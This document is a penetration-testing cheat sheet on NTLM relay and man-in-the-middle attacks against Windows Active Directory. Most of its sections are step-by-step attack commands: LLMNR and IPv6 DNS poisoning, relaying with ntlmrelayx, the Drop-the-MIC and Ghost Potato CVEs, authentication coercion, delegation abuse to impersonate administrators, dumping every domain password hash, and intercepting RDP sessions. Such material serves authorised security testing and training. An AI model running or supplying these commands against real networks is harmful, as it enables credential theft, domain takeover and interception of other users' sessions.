# Internal - MITM and Relay

NTLMv1 and NTLMv2 can be relayed to connect to another machine.

| Hash                  | Hashcat | Attack method        |
|-----------------------|---------|----------------------|
| LM                    | `3000`  | crack/pass the hash  |
| NTLM/NTHash           | `1000`  | crack/pass the hash  |
| NTLMv1/Net-NTLMv1     | `5500`  | crack/relay attack   |
| NTLMv2/Net-NTLMv2     | `5600`  | crack/relay attack   |

Crack the hash with `hashcat`.

```powershell
hashcat -m 5600 -a 0 hash.txt crackstation.txt
```

## MS08-068 NTLM reflection

NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.

> This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.

* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068

```powershell
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets
```


## LDAP signing not required and LDAP channel binding disabled

During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:

* LDAP signing not required (by default set to `Not required`)
* LDAP channel binding is disabled. (by default disabled)
* `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10 by default)

Then we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder` and use `ntlmrelayx` to add our computer.

```bash
# On first terminal
sudo ./Responder.py -I eth0 -wfrd -P -v

# On second terminal
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```
It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.


## SMB Signing Disabled and IPv4

If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine. Also called **LLMNR/NBNS Poisoning**

1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.
    ```powershell
    [Responder Core]
    ; Servers to start
    ...
    SMB = Off     # Turn this off
    HTTP = Off    # Turn this off
    ```
2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
3. Run `python Responder.py -I <interface_card>` 
4. Use a relay tool such as `ntlmrelayx` or `MultiRelay`
    - `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list. 
    - `python MultiRelay.py -t <target_machine_IP> -u ALL`
5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
    ```powershell
    $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> socks
    Protocol  Target          Username                  Port
    --------  --------------  ------------------------  ----
    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433

    # You might need to select a target with "-t"
    # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://
    impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support

    # the socks proxy can then be used with your Impacket tools or netexec
    $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
    $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
    $ proxychains netexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
    ```

**Mitigations**:

 * Disable LLMNR via group policy
    ```powershell
    Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled
    ```
 * Disable NBT-NS
    ```powershell
    This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under "NetBIOS setting" select Disable NetBIOS over TCP/IP
    ```


## SMB Signing Disabled and IPv6

Since [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.

```powershell
netexec smb $hosts --gen-relay-list relay.txt

# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
# -d is the domain name that we filter our request on - the attacked domain
# -i is the interface we have mitm6 listen on for events
mitm6 -i eth0 -d $domain

# spoofing WPAD and relaying NTLM credentials
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug

# -ip is the interface you want the relay to run on
# -wh is for WPAD host, specifying your wpad file to serve
# -t is the target where you want to relay to. 
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```


## Drop the MIC - CVE-2019-1040

> The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP

Check vulnerability with [cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)

```powershell
python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)
```

- Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
    ```powershell
    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
    TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
    TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
    ```

- Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.

    ```powershell
    # create a new machine account
    TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
    TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
    TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME

    # connect using the ticket
    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
    secretsdump.py -k -no-pass second-dc-server.local -just-dc
    ```


## Drop the MIC 2 - CVE-2019-1166

> A tampering vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC (Message Integrity Check) protection. An attacker who successfully exploited this vulnerability could gain the ability to downgrade NTLM security features. To exploit this vulnerability, the attacker would need to tamper with the NTLM exchange. The attacker could then modify flags of the NTLM packet without invalidating the signature.

* Unset the signing flags in the `NTLM_NEGOTIATE` message (`NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`)
* Inject a rogue msvAvFlag field in the `NTLM_CHALLENGE` message with a value of zeros
* Remove the MIC from the `NTLM_AUTHENTICATE` message
* Unset the following flags in the `NTLM_AUTHENTICATE` message: `NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`, `NEGOTIATE_KEY_EXCHANGE`, `NEGOTIATE_VERSION`.

```ps1
ntlmrelayx.py -t ldap://dc.domain.com --escalate-user 'youruser$' -smb2support --remove-mic --delegate-access
```


## Ghost Potato - CVE-2019-1384

Requirements:

* User must be a member of the local Administrators group
* User must be a member of the Backup Operators group
* Token must be elevated

Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip

```powershell
ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
```


## RemotePotato0 DCOM DCE RPC relay 

> It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine

Requirements:

- a shell in session 0 (e.g. WinRm shell or SSH shell)
- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)

```powershell
# https://github.com/antonioCoco/RemotePotato0/
Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```


## DNS Poisonning - Relay delegation with mitm6

Requirements: 

- IPv6 enabled (Windows prefers IPV6 over IPv4)
- LDAP over TLS (LDAPS)

> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.

```powershell
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: the domain name that we filter our request on (the attacked domain)
# -i: the interface we have mitm6 listen on for events
# -hw: host whitelist

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: the interface you want the relay to run on
# -wh: WPAD host, specifying your wpad file to serve
# -t: the target where you want to relay to

# now granting delegation rights and then do a RBCD
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```


## Relaying with WebDav Trick

> Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB

**Requirement**:

*  WebClient service

**Exploitation**:

* Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
* Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
* Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
* Discover WebDAV services
    ```ps1
    webclientservicescanner 'domain.local'/'user':'password'@'machine'
    netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
    GetWebDAVStatus.exe 'machine'
    ```
* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
  ```ps1
  # PrinterBug
  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  SpoolSample.exe "TARGET_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

  # PetitPotam
  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  ```
* Use the created account to ask for a service ticket: 
    ```ps1
    .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
    .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
    ls \\PC1.purple.lab\c$
    # IP of PC1: 10.0.0.4
    ```


## Man-in-the-middle RDP connections with pyrdp-mitm

* https://github.com/GoSecure/pyrdp
* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/

**Usage**

```sh
pyrdp-mitm.py <IP>
pyrdp-mitp.py <IP>:<PORT> # with custom port
pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
```

**Exploitation**

* If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
* If NLA is disabled, you will obtain the password in plaintext
* Other features are available such as keystroke recording

**Alternatives**

* S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	


## References

* [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema - June 13, 2019](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
* [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
* [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - July 23, 2024](https://logan-goins.com/2024-07-23-ldap-relay/)
* [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
* [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers - 07/27/2024](https://www.youtube.com/watch?v=iBqOOkQGJEA)
* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher - Mar 9, 2018](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)